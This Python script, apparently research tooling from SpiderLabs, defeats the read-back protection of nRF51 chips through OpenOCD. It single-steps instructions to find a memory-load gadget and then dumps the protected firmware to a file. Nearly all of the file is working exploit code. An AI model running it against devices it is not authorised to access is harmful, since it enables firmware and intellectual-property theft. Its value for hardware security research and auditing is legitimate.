#!/usr/bin/env python3
#
# nrfdump dumps memory of read-back protected nRF51 chips.
# It connects to OpenOCD GDB server, finds an instruction 
# that can be used to copy a memory address into a register 
# and dumps the memory by (ab)using this instruction.  
# Please be warned that for some (rather unusual) chip code 
# and/or memory configurations, running nrfdump can have
# undesirable effects, ranging from the script not being able 
# to find a usable instruction to misconfiguration of the device 
# or even *BRICK*.
# Use at your own risk!
#
# forestmike @ SpiderLabs
# 2018/01/12
#
# Updated to work with python-openocd (https://gitlab.zapb.de/openocd/python-openocd) 
# to remove telnetlib dependency and speed up significantly
# Erik @ error32.io
# 2024/11/22

from openocd import *

import re
import sys
import struct

class NrfDump:

    openocd_host = None
    openocd_port = None
    known_address = None
    known_value = None

    reg_in = None
    reg_out = None
    pc = None

    oocd = None

    registers = ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7', 'r8', 'r9', 'r10', 'r11', 'r12', 'sp']

    def __init__(self, openocd_host, openocd_port):
        self.openocd_host = openocd_host
        self.openocd_port = openocd_port
        self.oocd = OpenOcd(openocd_host, openocd_port)
        self.oocd.connect()
        self.oocd.reset(ResetType.HALT)

    def show_status(self):
        print("Known address: %s" % hex(self.known_address))
        print("Known value at the address: %s" % hex(self.known_value))
        print("Instruction address: %s" % hex(self.pc))
        print("Register in: %s" % self.reg_in)
        print("Register out: %s" % self.reg_out)

    def read_rbpconf(self, addr = 0x10001004):
        print("[*] Reading RBPCONF to establish known memory address / value...")
        self.known_address = addr
        try:
            self.known_value = self.oocd.read_memory(addr, 1, 32)[0]
            print("[***] RBPCONF is: %s" % hex(self.known_value))
        except:
            # exit if anything goes wrong
            print("mdw returned unexpected value for rbpconf: >%s<" % self.oocd.read_memory(addr))
            sys.exit(1)

    def get_reg(self, reg):
        resp = self.send_cmd('reg %s' % reg)
        m = re.search('0x[0-9A-Fa-f]+', resp)
        if m and m.group(0):
            return m.group(0)
        else:
            # exit if anything goes wrong
            print("get_reg received unexpected input: >%s<" % self.connection.response)
            sys.exit(1)

    def set_all_regs(self, val):
        for reg in self.registers:
            self.oocd.write_registers({reg: val})

    def run_instr(self, pc):
        self.oocd.write_registers({'pc': pc})
        self.oocd.step()

    def check_regs(self):
        allregs = self.oocd.read_registers(self.registers)
        for reg, value in allregs.items():
            if value == self.known_value:
                self.reg_out = reg
                return True
        return False

    def find_pc(self):
        print("[*] Searching for usable instruction...")
        self.oocd.reset(ResetType.HALT)
        pc = self.oocd.read_registers(['pc'])['pc']

        found = False
        while not found:
            self.set_all_regs(self.known_address)
            print("[*] pc = %s" % hex(pc))
            self.run_instr(pc)
            found = self.check_regs()
            if not found:
                pc = pc + 2

        if found:
            self.pc = pc
            print("[***] Known value found in register %s for pc = %s" % (self.reg_out, hex(self.pc)))

    def find_reg_in(self):
        print("[*] Checking which register is the source...")
        found = False
        for reg in self.registers:
            self.set_all_regs(0x00000000)
            print("[*] register: %s" % reg)
            self.oocd.write_registers({reg: self.known_address})
            self.run_instr(self.pc)
            found = self.check_regs()
            if found:
                self.reg_in = reg
                print('[***] Found source register: %s' % reg)
                break
        # reg_in not found -- exit
        if not found:
            print('Input register not found...')
            sys.exit(1)

    def dump_fw(self, fname = None, from_addr=0x00000000, to_addr=0x00040000):
        self.oocd.reset(ResetType.HALT)
        cur_addr = from_addr

        f = None
        if fname is not None:
            print("[*] Dumping memory (%s - %s) to output file: %s ..." % (hex(from_addr), hex(to_addr), fname))
            f = open(fname, "wb")

        while cur_addr < to_addr:
            self.oocd.write_registers({'pc': self.pc, self.reg_in: cur_addr})
            self.run_instr(self.pc)

            val = self.oocd.read_registers([self.reg_out])[self.reg_out]
            print("%s: %s" % (hex(cur_addr), hex(val)))

            if f is not None:
                bindata = struct.pack('I', val)
                f.write(bindata)

            cur_addr += 4

        if f is not None:
            f.close()

if __name__ == '__main__':
    nrf = NrfDump('localhost', 6666)
    nrf.read_rbpconf()
    nrf.find_pc()
    nrf.find_reg_in()
    print("\n[***] The state of the game:")
    nrf.show_status()
    print()
    nrf.dump_fw("out.bin")